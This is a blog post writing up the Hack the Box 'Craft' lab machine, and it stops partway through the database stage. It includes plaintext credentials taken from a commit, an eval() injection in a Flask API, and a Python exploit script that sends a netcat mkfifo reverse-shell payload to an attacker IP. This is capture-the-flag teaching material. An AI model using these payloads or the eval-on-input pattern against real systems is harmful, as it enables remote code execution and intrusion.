<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/images/favicon.ico>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Ryan Kozak - Hack the Box Craft Writeup</title>
<meta property="og:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Craft&#32;Writeup />
<meta name="twitter:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Craft&#32;Writeup />
<meta itemprop="name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Craft&#32;Writeup />
<meta name="application-name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Craft&#32;Writeup />
<meta property="og:site_name" content="Ryan Kozak" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://ryankozak.com/posts/hack-the-box-craft-writeup/" />
<link rel="canonical" href="https://ryankozak.com/posts/hack-the-box-craft-writeup/" itemprop="url" />
<meta name="url" content="https://ryankozak.com/posts/hack-the-box-craft-writeup/" />
<meta name="twitter:url" content="https://ryankozak.com/posts/hack-the-box-craft-writeup/" />
<meta property="og:url" content="https://ryankozak.com/posts/hack-the-box-craft-writeup/" />


<meta property="og:updated_time" content="2020-01-05T18:44:42-07:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="Ryan Kozak" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.136.2">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://ryankozak.com/">
                <img src="/images/d0n601.jpg" alt="brand image">
            </a>
        
        
            <a href="https://ryankozak.com/">
                <h1>Ryan Kozak</h1>
            </a>
        
    </h1>
    <p class="lead">
    Hacking, web development, $other
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about">About</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2024-9162/">All-in-One WP Migration and Backup &lt;= 7.86 - Authenticated (Administrator&#43;) Arbitrary PHP Code Injection</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/hack-the-box-armageddon-writeup/">Hack the Box Armageddon Writeup</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/hack-the-box-ophiuchi-writeup/">Hack the Box Ophiuchi Writeup</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/luks-encrypted-arch-linux-on-pinebook-pro-again/">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/luks-encrypted-arch-linux-on-pinebook-pro/">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/d0n601">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ryan-kozak/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>















    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>


    <a target="_blank" class="social" title="Email" href="mailto://whodis@ryankozak.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
    &copy; 2024 Ryan Kozak. All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://ryankozak.com/posts/hack-the-box-craft-writeup/">Hack the Box Craft Writeup</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2020-01-05T18:44:42-0700" class="post-date">
        January 5, 2020
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>9 mins read</span>
      </span>
    </div>

    
  </div>

  
  

  
</div>

  <p><img src="/posts/images/hack-the-box-craft-writeup/badge.png" alt="Hack The Box Craft"></p>
<h1 id="introduction">Introduction</h1>
<p>Today they retired my favorite box so far, Craft. This box was very real world in the chain of mistakes that lead to each exploit. The beer theme and Silicon Valley theme were also awesome. A+ box, and here&rsquo;s the writeup.</p>
<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# nmap -sVC 10.10.10.110
</span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-13 23:23 EDT
</span></span><span style="display:flex;"><span>Nmap scan report for craft.htb (10.10.10.110)
</span></span><span style="display:flex;"><span>Host is up (0.40s latency).
</span></span><span style="display:flex;"><span>Not shown: 998 closed ports
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
</span></span><span style="display:flex;"><span>|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.15.8
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.15.8
</span></span><span style="display:flex;"><span>|_http-title: 400 The plain HTTP request was sent to HTTPS port
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
</span></span><span style="display:flex;"><span>| Not valid before: 2019-02-06T02:25:47
</span></span><span style="display:flex;"><span>|_Not valid after:  2020-06-20T02:25:47
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| tls-alpn:
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>| tls-nextprotoneg:
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 62.69 seconds
</span></span></code></pre></div><p>We see from the output above that ports <strong>22</strong> and <strong>443</strong> are open, meaning we&rsquo;ve got <code>ssh</code> and <code>https</code> to play with. Let&rsquo;s explore port <strong>443</strong>.</p>
<h3 id="port-443-craft">Port 443: Craft</h3>
<p><img src="/posts/images/hack-the-box-craft-writeup/craft_homepage.png" alt="Craft Homepage">
<strong>Figure 1:</strong> Craft&rsquo;s Homepage</p>
<p>So it looks like there are some links to subdomains. Let&rsquo;s add these to our <code>/etc/hosts</code> file so that we can access the other virtual hosts running on the box.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# cat /etc/hosts
</span></span><span style="display:flex;"><span>127.0.0.1 localhost
</span></span><span style="display:flex;"><span>127.0.1.1 kali
</span></span><span style="display:flex;"><span>10.10.10.110    craft.htb
</span></span><span style="display:flex;"><span>10.10.10.110    api.craft.htb
</span></span><span style="display:flex;"><span>10.10.10.110    gogs.craft.htb
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># The following lines are desirable <span style="color:#66d9ef">for</span> IPv6 capable hosts
</span></span><span style="display:flex;"><span>::1     localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>ff02::1 ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2 ip6-allrouters
</span></span></code></pre></div><p>Now we can access the two links in the upper right hand corner <code>https://api.craft.htb/api</code> and <code>https://gogs.craft.htb</code>.</p>
<p>We see the documentation page for <code>Craft API 1.0</code>. The page gives us some information about the API&rsquo;s endpoints and how to interact with them.</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/craft_api_page.png" alt="Craft API 1.0">
<strong>Figure 2:</strong> Craft API 1.0</p>
<p>The other link on the page is to <em><a href="https://gogs.io/" target="_blank">Gogs</a></em>, a self hosted git repository. This is fun! It looks like we may get to hack an open source program. Does this remind you of digging through repos on <em><a href="https://github.com" target="_blank">GitHub</a></em>?</p>
<p>Going through the commit history we come across some committed credentials right away. The screenshot actually contains the commit in which they were removed, but we can see through red highlighting!</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/gogs_credentials.png" alt="API Credentials in Commit">
<strong>Figure 3:</strong> API Credentials in Commit</p>
<p>It looks like these credentials will also log us into the Gogs account for Dinesh, but there&rsquo;s nothing much to see inside Dinesh&rsquo;s account.</p>
<p>By taking a look at the Craft API code we see it&rsquo;s a <code>Python / Flask</code> application. Furthermore, it looks like the endpoint <code>/craft_api/api/brew/endpoints/brew.py</code> calls the <code>eval()</code> function on user input!. It says that authentication is required, but I think we&rsquo;ve got that covered already with  <code>auth=('dinesh', '4aUh0A8PbVJxgd')</code>.</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/eval_in_brew_endpoint.png" alt="Eval code in brew.py">
<strong>Figure 4:</strong> Exploitable code in <code>/craft_api/api/brew/endpoints/brew.py</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#a6e22e">@auth.auth_required</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@api.expect</span>(beer_entry)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Creates a new brew entry.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># make sure the ABV value is sane.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;abv&#39;</span>]):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ABV must be a decimal value less than 1.0&#34;</span>, <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            create_brew(request<span style="color:#f92672">.</span>json)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#ae81ff">201</span>
</span></span></code></pre></div><p>We could use <code>curl</code> or <code>postman</code> to send requests to the API, but if we continue to look through the git repo we see in commit <code>10e3ba4f0a09c778d7cec673f28d410b73455a86</code> that they&rsquo;ve got a test script already to post new brews.</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/added_test.png" alt="Added test">
<strong>Figure 5:</strong> add test script you say!?</p>
<p>Download the test script from here and we&rsquo;ll use it to send a payload to the app. <code>https://gogs.craft.htb/Craft/craft-api/src/10e3ba4f0a09c778d7cec673f28d410b73455a86/tests/test.py</code></p>
<h1 id="exploitation">Exploitation</h1>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>So far we&rsquo;ve found an API, a <code>git</code> repository containing Python code which seems vulnerable to command injection, as well as a commit containing credentials and a test script.</p>
<p>Developing the exploit isn&rsquo;t easy. We can test the code locally but we don&rsquo;t know exactly what&rsquo;s installed on the machine. This process required developing several payloads that ran correctly locally, only to fail on the box. As it turns out, the box doesn&rsquo;t have <code>bash</code> installed on it. Eventually we&rsquo;re able to gain a reverse shell using netcat with the following payload sent to <code>avb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;__import__(&#34;os&#34;).system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.186 4444 &gt;/tmp/f&#34;) &#34;&#34;&#34;</span>
</span></span></code></pre></div><p>Here&rsquo;s the modified <code>test.py</code> script with the payload to call our reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/login&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span>), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>json_response <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span>  json_response[<span style="color:#e6db74">&#39;token&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;__import__(&#34;os&#34;).system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.186 4444 &gt;/tmp/f&#34;) &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;X-Craft-API-Token&#39;</span>: token, <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e"># create a sample brew with real shell code... should exploit!</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Create exploit brew!&#34;</span>)
</span></span><span style="display:flex;"><span>brew_dict <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>brew_dict[<span style="color:#e6db74">&#39;abv&#39;</span>] <span style="color:#f92672">=</span> payload
</span></span><span style="display:flex;"><span>brew_dict[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit199iii1&#39;</span>
</span></span><span style="display:flex;"><span>brew_dict[<span style="color:#e6db74">&#39;brewer&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit1991&#39;</span>
</span></span><span style="display:flex;"><span>brew_dict[<span style="color:#e6db74">&#39;style&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshi1991t&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(brew_dict)
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;https://api.craft.htb/api/brew/&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p>When we run the script with our sexy little payload we catch a reverse shell, and gain our initial foothold.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nc -lvp 4444
</span></span><span style="display:flex;"><span>listening on [any] 4444 ...
</span></span><span style="display:flex;"><span>connect to [10.10.14.186] from craft.htb [10.10.10.110] 35703
</span></span><span style="display:flex;"><span>/bin/sh: can&#39;t access tty; job control turned off
</span></span><span style="display:flex;"><span>/opt/app # whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>/opt/app # cd /
</span></span><span style="display:flex;"><span>/ # ls -la
</span></span><span style="display:flex;"><span>total 64
</span></span><span style="display:flex;"><span>drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
</span></span><span style="display:flex;"><span>drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>/ #
</span></span></code></pre></div><h2 id="user-flag">User Flag</h2>
<p>It looks like we&rsquo;re in a docker container, so we need to escape that somehow. Under <code>/opt/app</code> we see a file named <code>dbtest.py</code>. Here are the contents of that file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pymysql
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> craft_api <span style="color:#f92672">import</span> settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># test connection to mysql database</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>connection <span style="color:#f92672">=</span> pymysql<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_HOST,
</span></span><span style="display:flex;"><span>                             user<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_USER,
</span></span><span style="display:flex;"><span>                             password<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_PASSWORD,
</span></span><span style="display:flex;"><span>                             db<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_DB,
</span></span><span style="display:flex;"><span>                             cursorclass<span style="color:#f92672">=</span>pymysql<span style="color:#f92672">.</span>cursors<span style="color:#f92672">.</span>DictCursor)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
</span></span><span style="display:flex;"><span>        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&#34;</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#f92672">.</span>execute(sql)
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchone()
</span></span><span style="display:flex;"><span>        print(result)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>    connection<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>If we modify <code>dbtest.py</code> to execute other commands we can explore the application&rsquo;s mysql database a bit more.</p>
<p>First, let&rsquo;s see what tables we have in here. We replace the sql statement above with one to show us the tables, and replace the <code>fetchone()</code> command with <code>fetchall()</code>.</p>
